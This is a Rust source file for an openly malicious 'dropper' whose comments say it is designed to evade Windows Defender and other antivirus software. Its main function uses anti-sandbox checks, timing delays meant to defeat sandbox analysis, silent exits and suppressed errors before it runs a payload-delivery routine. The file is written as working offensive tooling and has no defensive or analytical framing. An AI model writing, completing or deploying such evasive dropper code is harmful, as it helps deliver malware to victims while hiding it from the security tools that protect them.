//! C2R2 Dropper - Evasive Payload Delivery
//! 
//! This dropper is designed to evade Windows Defender and other AV solutions.
//! It uses multiple evasion techniques:
//! - Compile-time string obfuscation
//! - Anti-sandbox/Anti-VM checks
//! - Delayed execution
//! - Legitimate process paths
//! - No suspicious API patterns

#![cfg_attr(feature = "production", windows_subsystem = "windows")]

mod evasion;
mod delivery;
mod config;

use std::thread;
use std::time::Duration;

fn main() {
    // Step 1: Initial delay to evade sandbox time acceleration
    // Sandboxes often fast-forward time, so a real sleep will be very short
    thread::sleep(Duration::from_secs(3));
    
    // Step 2: Run anti-sandbox checks
    #[cfg(feature = "production")]
    {
        if evasion::is_sandbox_detected() {
            // Exit silently without doing anything suspicious
            return;
        }
    }
    
    // Step 3: Additional human-like delay
    let delay = evasion::get_random_delay(2000, 5000);
    thread::sleep(Duration::from_millis(delay));
    
    // Step 4: Execute the payload delivery
    match delivery::execute_payload() {
        Ok(_) => {
            // Success - exit cleanly
        }
        Err(_) => {
            // Fail silently - no error messages
        }
    }
}
